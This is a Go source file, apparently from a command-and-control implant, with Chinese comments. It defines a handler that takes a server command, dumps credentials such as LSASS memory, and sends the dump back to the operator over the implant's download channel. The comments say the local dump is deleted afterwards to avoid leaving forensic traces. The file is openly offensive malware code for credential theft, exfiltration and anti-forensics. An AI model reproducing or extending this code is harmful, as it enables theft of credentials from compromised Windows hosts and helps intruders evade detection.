package services

import (
	"errors"
	"fmt"
	"implant/core/debuglog"
	"strings"
)

// 凭据获取（阶段三）：cmdBuf = "kind|tech|fileName"
//
// 制品经**下载通道**回传（复用 v2 下载协议：type22 头 + type26 分块），
// 不新增回传通道 —— 文件传输的断点/分块/落盘逻辑已经在那里验证过了。
//
// 拿到转储后立刻删除本地文件：转储留在目标磁盘上是最典型的取证痕迹，
// 而且 LSASS 转储体积可观（数百 MB），留在盘上既显眼又占空间。
func CmdCredDump(cmdBuf []byte) ([]byte, error) {
	parts := strings.SplitN(string(cmdBuf), "|", 3)
	if len(parts) != 3 {
		return nil, errors.New("凭据命令格式错误（期望 kind|tech|fileName）")
	}
	kind, tech, fileName := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]), strings.TrimSpace(parts[2])
	if kind == "" || fileName == "" {
		return nil, errors.New("凭据命令缺少类型或文件名")
	}
	// 文件名来自服务端，但仍做一次净化：它会被拼进目标路径
	if strings.ContainsAny(fileName, `/\`) || strings.Contains(fileName, "..") {
		return nil, errors.New("非法的制品文件名")
	}
	if tech == "" {
		tech = "auto"
	}

	destPath, err := dumpCredential(kind, tech, fileName)
	if err != nil {
		debuglog.Printf("❌ [CRED] %s 获取失败: %v\n", kind, err)
		return nil, err
	}
	debuglog.Printf("✅ [CRED] %s 转储已生成: %s，开始回传\n", kind, destPath)

	// 异步回传：下载通道本身是流式的，同步等会把命令处理链卡住
	go exfilFile(destPath, true)
	return []byte(fmt.Sprintf("[+] %s 内存转储已生成并开始回传: %s", strings.ToUpper(kind), fileName)), nil
}
